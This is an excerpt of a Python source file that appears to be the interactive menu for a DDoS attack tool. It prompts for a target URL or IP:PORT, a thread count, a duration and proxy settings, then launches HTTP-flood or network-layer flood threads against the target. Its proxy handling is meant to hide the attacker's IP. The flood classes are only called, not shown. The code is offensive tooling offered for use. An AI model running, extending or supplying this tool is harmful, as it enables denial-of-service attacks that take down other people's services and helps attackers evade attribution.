...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    ...
    if not proxy_li.exists():
        ...
        with proxy_li.open("w") as wr:
            ...
            if not Proxies:
                exit("Proxy Check Failed, Your IP has been exposed!")
            for pro in Proxies:
                wr.write(f"{pro}\n")
    else:
        with proxy_li.open("r") as rd:
            Proxies = {Proxy.parse(line.strip()) for line in rd if line.strip()}
    return Proxies
...
def display_methods(methods, title):
    table = [[i + 1, method] for i, method in enumerate(sorted(methods))]
    print(f"\n{bcolors.OKBLUE}{title}{bcolors.RESET}")
    print(tabulate(table, headers=["ID", "Method"], tablefmt="fancy_grid"))

def get_input(prompt, default=None, type_cast=str, validator=None):
    while True:
        value = input(f"{bcolors.OKCYAN}{prompt}{bcolors.RESET}").strip() or default
        if not value:
            print(f"{bcolors.FAIL}Input cannot be empty!{bcolors.RESET}")
            continue
        try:
            value = type_cast(value)
            if validator and not validator(value):
                print(f"{bcolors.FAIL}Invalid input!{bcolors.RESET}")
                continue
            return value
        except ValueError:
            print(f"{bcolors.FAIL}Invalid format!{bcolors.RESET}")

def main_menu():
    options = [
        ["1", "Layer7", "HTTP-based DDoS attacks"],
        ["2", "Layer4", "Network-based DDoS attacks"],
        ["3", "Tools", "Network diagnostic tools"],
        ["4", "Help", "Show usage information"],
        ["5", "Exit", "Quit the program"]
    ]
    print(f"\n{bcolors.OKBLUE}Main Menu{bcolors.RESET}")
    print(tabulate(options, headers=["ID", "Option", "Description"], tablefmt="fancy_grid"))
    choice = get_input("Select an option (1-5): ", validator=lambda x: x in "12345")
    return choice

def run_attack(method, target, threads, duration, proxies=None, rpc=1, debug=False):
    if debug:
    ...
    if method in Methods.LAYER7_METHODS:
        url = URL(target)
        threads_list = [
            HttpFlood(i, url, url.host, method, rpc, event, None, None, proxies)
            for i in range(threads)
        ]
    else:
        target_tuple = (target.split(":")[0], int(target.split(":")[1]) if ":" in target else 80)
        threads_list = [
            Layer4(target_tuple, method=method, synevent=event, proxies=proxies)
    ...
    print(f"{bcolors.OKGREEN}Attack started: {method} on {target} with {threads} threads for {duration}s{bcolors.RESET}")
    time.sleep(duration)
    
    event.clear()
    for t in threads_list:
        t.join()
    print(f"{bcolors.OKGREEN}Attack completed!{bcolors.RESET}")
...
if __name__ == '__main__':
    ...
    while True:
        ...
        if choice == "5":
            print(f"{bcolors.OKCYAN}Exiting...{bcolors.RESET}")
            sys.exit(0)
        ...
        # Layer7 hoặc Layer4
        methods = Methods.LAYER7_METHODS if choice == "1" else Methods.LAYER4_METHODS
        display_methods(methods, f"Available {'Layer7' if choice == '1' else 'Layer4'} Methods")
        
        method_id = get_input("Select method ID: ", type_cast=int, validator=lambda x: 1 <= x <= len(methods))
        method = sorted(methods)[method_id - 1]
        
        if choice == "1":
            target = get_input("Enter target URL (e.g., http://example.com): ", validator=lambda x: x.startswith(('http://', 'https://')))
            rpc = get_input("Enter RPC (requests per connection) [default: 100]: ", default="100", type_cast=int, validator=lambda x: x > 0)
        else:
            target = get_input("Enter target IP:PORT (e.g., 1.2.3.4:80): ", validator=lambda x: ":" in x and x.split(":")[0].count(".") == 3)
        
        threads = get_input("Enter number of threads [default: 100]: ", default="100", type_cast=int, validator=lambda x: x > 0)
        duration = get_input("Enter duration (seconds) [default: 60]: ", default="60", type_cast=int, validator=lambda x: x > 0)
        use_proxies = get_input("Use proxies? (y/n) [default: n]: ", default="n", validator=lambda x: x.lower() in "yn").lower() == "y"
        
        proxies = None
        if use_proxies:
            proxy_type = get_input("Enter proxy type (4=SOCKS4, 5=SOCKS5, 1=HTTP, 0=ALL, 6=RANDOM) [default: 6]: ", default="6", type_cast=int, validator=lambda x: x in {0, 1, 4, 5, 6})
            proxy_file = get_input("Enter proxy file path [default: files/proxies/proxies.txt]: ", default="files/proxies/proxies.txt")
            proxy_li = Path(__dir__ / proxy_file)
            proxies = handleProxyList(con, proxy_li, proxy_type, URL(target) if choice == "1" else None)
        
        debug = get_input("Enable debug mode? (y/n) [default: n]: ", default="n", validator=lambda x: x.lower() in "yn").lower() == "y"
        
        try:
            run_attack(method, target, threads, duration, proxies, rpc if choice == "1" else 1, debug)
        except Exception as e:
            print(f"{bcolors.FAIL}Error: {str(e)}{bcolors.RESET}")
